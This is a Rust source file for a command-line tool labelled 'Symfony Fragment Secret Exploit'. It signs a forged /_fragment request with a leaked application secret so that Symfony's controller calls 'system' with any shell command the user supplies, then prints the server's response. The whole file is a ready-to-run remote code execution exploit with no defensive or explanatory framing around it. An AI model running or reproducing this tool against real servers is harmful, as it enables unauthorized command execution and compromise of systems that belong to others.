use base64::{engine::general_purpose, Engine as _};
use clap::Parser;
use html2text::from_read;
use percent_encoding::{utf8_percent_encode, AsciiSet, CONTROLS};
use reqwest;
use ring::hmac;
use std::process::exit;
use url::form_urlencoded;

#[derive(Parser)]
#[clap(name = "symfonysecret", author = "joaojj", version = "1.0", about="Symfony Fragment Secret Exploit", long_about = None)]
struct Args {
    #[clap(short, long, required = true, help = "Insert URL")]
    url: String,

    #[clap(short, long, required = true, help = "Insert secret")]
    secret: String,

    #[clap(short, long, required = true, help = "Insert command")]
    command: String,
}

async fn symfragment_attack(params: Vec<&String>, job: Vec<(&str, String)>) {
    let mut encoded_query = form_urlencoded::Serializer::new(String::new())
        .extend_pairs(job.iter())
        .finish();
    const FRAGMENT: &AsciiSet = &CONTROLS.add(b'=').add(b'&').add(b'+');
    encoded_query = utf8_percent_encode(encoded_query.as_str(), FRAGMENT).to_string();
    let mut url_fragment = format!("{}/_fragment?_path={}", params[0], encoded_query);
    let secret = params[1].as_bytes();
    let key = hmac::Key::new(hmac::HMAC_SHA256, secret);
    let tag = hmac::sign(&key, url_fragment.as_bytes());
    let hash = general_purpose::STANDARD.encode(&tag);
    url_fragment = format!("{}&_hash={}", url_fragment, hash);

    let response = reqwest::get(url_fragment).await.unwrap_or_else(|e| {
        eprintln!("{e}");
        exit(0);
    });
    let body = response.text().await;

    match body {
        Ok(result) => {
            println!("{}", from_read(result.as_bytes(), 80));
        }
        Err(_) => {
            println!("[!] Error making the request");
        }
    }
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let params = vec![&args.url, &args.secret];
    let job = vec![
        ("_controller", String::from("system")),
        ("command", String::from(&args.command)),
        ("return_value", String::from("null")),
    ];

    symfragment_attack(params, job).await;
}
